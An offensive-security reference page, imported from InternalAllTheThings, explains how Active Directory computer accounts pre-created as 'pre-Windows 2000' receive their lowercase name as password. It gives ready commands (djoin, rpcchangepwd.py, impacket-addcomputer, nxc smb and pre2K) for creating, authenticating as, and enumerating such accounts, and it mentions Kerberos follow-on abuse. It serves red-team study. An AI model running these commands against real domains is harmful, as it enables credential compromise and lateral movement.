---
title: Password - Pre-Created Computer Account
type: technique
tags: [active-directory, credentials, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Password - Pre-Created Computer Account

## What it is

When `Assign this computer account as a pre-Windows 2000 computer` checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account **SERVERDEMO$** would have the password **serverdemo**.

## How it works

When a computer account is pre-created in AD with the "Assign this computer account as a pre-Windows 2000 computer" checkbox enabled, its initial password is set to the lowercase sAMAccountName (without the trailing `$`). Attackers enumerate computer accounts with this condition by checking if the account's `userAccountControl` includes the `UF_PASSWD_NOTREQD` flag, then attempt authentication using the lowercase account name as the password. Successfully authenticated computer accounts can be used for Kerberos attacks including S4U2self and RBCD if the quota or delegation settings permit.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

When `Assign this computer account as a pre-Windows 2000 computer` checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account **SERVERDEMO$** would have the password **serverdemo**.

```ps1
# Create a machine with default password
# must be run from a domain joined device connected to the domain
djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc
```

* When you attempt to login using the credential you should have the following error code : `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.
* Then you need to change the password with [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304)

```ps1
python3 rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'
```

:warning: When the machine account name and the password are the same, the machine will also act like a pre-Windows 2000 computer and the authentication will result in `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.

```ps1
$ impacket-addcomputer -dc-ip 10.10.10.10 EXODIA.LOCAL/Administrator:P@ssw0rd -computer-name swkserver -computer-pass swkserver
[*] Successfully added machine account swkserver$ with password swkserver.

$ nxc smb 10.10.10.10 -u 'swkserver$' -p swkserver    
SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-8OJFTLMU1IG) (domain:EXODIA.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [-] EXODIA.LOCAL\swkserver$:swkserver STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

## Enumerate Pre-Created Computer Account

Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each

```ps1
nxc -u username -p password -M pre2K
```

## References

* [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[impacket]]
- [[netexec]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
